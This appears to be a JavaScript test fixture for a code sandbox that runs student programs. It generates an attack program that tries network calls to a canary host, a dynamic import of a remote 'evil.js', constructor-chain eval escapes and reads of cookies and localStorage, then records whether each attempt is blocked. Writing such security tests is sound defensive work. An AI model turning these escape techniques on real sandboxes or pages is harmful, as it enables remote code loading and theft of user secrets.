export const HOST_SECRET = 'host-secret-value';
export const ATTACK_IDS = ['fetch', 'xhr', 'websocket', 'dynamic-import', 'eval-escape', 'host-secrets'];
export const LINE_PROGRAM = 'const first = 1;\nconst second = 2;\nnaoExiste();\n';
export const LOOP_PROGRAM = 'report({ type: "loop-started" });\nwhile (true) {}\n';

// Cada ataque roda como se fosse o programa do aluno; `report` vem do runner.
export function buildAttackProgram(canary) {
  return `
const CANARY = ${JSON.stringify(canary)};
const attempt = async (id, action) => {
  try {
    report({ type: 'attack', id, outcome: 'allowed', detail: String(await action()) });
  } catch (error) {
    report({ type: 'attack', id, outcome: 'blocked', detail: String(error?.name ?? error) });
  }
};
const whenSettled = (setup) => new Promise((resolve, reject) => { setup(resolve, reject); setTimeout(() => reject(new Error('Timeout')), 1500); });
await attempt('fetch', () => fetch(CANARY + '/fetch').then((response) => response.status));
await attempt('xhr', () => whenSettled((resolve, reject) => {
  const request = new XMLHttpRequest();
  request.open('GET', CANARY + '/xhr');
  request.onload = () => resolve(request.status);
  request.onerror = () => reject(new Error('XhrBlocked'));
  request.send();
}));
await attempt('websocket', () => whenSettled((resolve, reject) => {
  const socket = new WebSocket(CANARY.replace('http', 'ws') + '/websocket');
  socket.onopen = () => resolve('open');
  socket.onerror = () => reject(new Error('SocketBlocked'));
}));
await attempt('dynamic-import', () => import(CANARY + '/evil.js'));
await attempt('eval-escape', () => {
  const key = 'con' + 'structor';
  return [Function('return 42')(), [].constructor.constructor('return 42')(), [][key][key]('return 42')()];
});
await attempt('host-secrets', () => [
  typeof document === 'undefined' ? 'sem-document' : document.cookie,
  typeof localStorage === 'undefined' ? 'sem-localStorage' : localStorage.getItem('secret'),
  typeof parent === 'undefined' || parent === self ? 'sem-parent' : parent.document.cookie,
].join('|'));
`;
}
